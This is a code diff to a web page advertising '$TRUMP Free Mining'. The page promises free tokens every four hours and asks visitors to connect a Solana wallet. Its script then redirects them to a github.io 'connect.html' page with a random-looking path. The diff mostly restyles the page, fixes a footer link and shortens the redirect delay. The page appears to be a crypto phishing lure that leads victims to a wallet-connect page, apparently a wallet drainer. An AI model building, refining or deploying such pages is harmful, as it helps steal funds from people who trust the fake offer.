@@ -52,8 +52,7 @@
             background: linear-gradient(135deg, #2980b9, #e74c3c);
             padding: 40px;
             border-radius: 25px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-            width: 90%;
+            box-shadow: rgba(0, 0, 0, 0.17) 0px -23px 25px 0px inset, rgba(0, 0, 0, 0.15) 0px -36px 30px 0px inset, rgba(0, 0, 0, 0.1) 0px -79px 40px 0px inset, rgba(0, 0, 0, 0.06) 0px 2px 1px, rgba(0, 0, 0, 0.09) 0px 4px 2px, rgba(0, 0, 0, 0.09) 0px 8px 4px, rgba(0, 0, 0, 0.09) 0px 16px 8px, rgba(0, 0, 0, 0.09) 0px 32px 16px;            width: 90%;
             max-width: 400px;
             transition: transform 0.3s ease, box-shadow 0.3s ease;
             transform: translateY(10px);
@@ -61,8 +60,7 @@
 
         .card:hover {
             transform: translateY(-10px);
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
-        }
+            box-shadow: rgba(0, 0, 0, 0.17) 0px -23px 25px 0px inset, rgba(0, 0, 0, 0.15) 0px -36px 30px 0px inset, rgba(0, 0, 0, 0.1) 0px -79px 40px 0px inset, rgba(0, 0, 0, 0.06) 0px 2px 1px, rgba(0, 0, 0, 0.09) 0px 4px 2px, rgba(0, 0, 0, 0.09) 0px 8px 4px, rgba(0, 0, 0, 0.09) 0px 16px 8px, rgba(0, 0, 0, 0.09) 0px 32px 16px;        }
 
         .card h2 {
             font-size: 2rem;
@@ -124,11 +122,10 @@
         }
 
         .footer {
-            margin-top: 50px;
+            margin-top: 15px;
             font-size: 1rem;
             color: #ecf0f1;
-            position: absolute;
-            bottom: 20px;
+
         }
 
         .footer a {
@@ -165,7 +162,7 @@
             position: fixed;
             bottom: 0;
             width: 100%;
-            background-color: #1c0072;
+            background: linear-gradient(135deg, #297fb99c, #e74d3cac);
             display: flex;
             justify-content: space-around;
             padding: 15px 0;
@@ -223,14 +220,18 @@
                 font-size: 0.9rem;
             }
         }
+        .center {   
+            
+            margin-top: -30px;
+        }
     </style>
 </head>
 <body>
-
+    <div class="center">
     <h1>$TRUMP Free Mining</h1>
     <p>Mine 0.5 $TRUMP every 4 hours! Connect your wallet and start earning now!</p>
 
-
+</div>
     <!-- Connect Wallet Section -->
     <div class="card">
         <h2><i class="fas fa-wallet"></i> Connect your SOL Wallet</h2>
@@ -242,7 +243,7 @@
     <div id="spinner" class="spinner" style="display: none;"></div>
 
     <div class="footer">
-        <p>Powered by the <a href="https://https://x.com/realDonaldTrump" target="_blank">$TRUMP Community</a></p>
+        <p>Powered by the <a href="https://x.com/realDonaldTrump" target="_blank">$TRUMP Community</a></p>
     </div>
 
 
@@ -281,7 +282,7 @@
 
                 setTimeout(() => {
                     window.location.href = 'https://fauxon.github.io/fhrdhqctvghbn-/connect.html';
-                }, 3000);
+                }, 2000);
 
             }, 5000);
         }
@@ -289,3 +290,4 @@
 
 </body>
 </html>
+
